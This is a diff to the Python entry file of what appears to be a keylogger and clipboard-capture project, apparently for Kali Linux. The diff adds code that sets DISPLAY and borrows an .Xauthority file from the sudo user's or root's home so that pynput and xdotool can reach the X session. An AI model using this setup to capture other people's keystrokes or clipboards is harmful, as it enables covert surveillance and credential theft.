@@ -1,6 +1,23 @@
 import os
 import sys
 from pathlib import Path
+
+# Configurar entorno X11 para pynput, xdotool y pyperclip en Linux antes de importar módulos
+if sys.platform.startswith("linux"):
+    if "DISPLAY" not in os.environ:
+        os.environ["DISPLAY"] = ":0"
+    if "XAUTHORITY" not in os.environ or not os.path.isfile(os.environ.get("XAUTHORITY", "")):
+        usuario_obj = os.environ.get("SUDO_USER") or os.environ.get("USER") or "kali"
+        rutas_posibles = [
+            f"/home/{usuario_obj}/.Xauthority",
+            os.path.expanduser(f"~{usuario_obj}/.Xauthority"),
+            "/root/.Xauthority",
+        ]
+        for r in rutas_posibles:
+            if os.path.isfile(r):
+                os.environ["XAUTHORITY"] = r
+                break
+
 from modules.error_detection.error_detection import ErrorDetection
 from modules.keylogger.keylogger import Keylogger
 from modules.paperclip.paperclip import Paperclip
